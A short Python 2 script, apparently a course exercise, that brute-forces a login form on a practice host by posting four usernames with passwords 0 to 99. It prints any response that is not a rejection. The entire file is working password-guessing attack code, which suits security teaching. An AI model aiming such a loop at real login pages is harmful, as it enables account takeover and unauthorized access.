#!/usr/bin/python

import socket
import bs4
users = ['bill', 'ted', 'sally', 'sue']
socket.setdefaulttimeout(2)
# s = socket.socket()

req1 = """POST /python/login2.php HTTP/1.1
Host: attackdirect.samsclass.info
Connection: keep-alive
Content-Length: """

req2 = """Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: null
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.8
Cookie: __cfduid=defa9068e57cd00aaeaf3eff82897926c1374014337

"""
for user in users:
    for pw in range(100):
        s = socket.socket()
        length = len(user) + len(str(pw)) + 5
        s.connect(("attackdirect.samsclass.info", 80))
        s.send(req1 + str(length) + '\n' + req2 + "u=" + user + "&p=" + str(pw) + '\n')
        html = s.recv(1024)
        soup = bs4.BeautifulSoup(html, 'html5lib')
        if soup.select('h1')[0].getText() != 'Credentials rejected!':
            print soup.select('body')[0]
            # print soup.select('h1')[0].getText()
            # print html
        s.close()
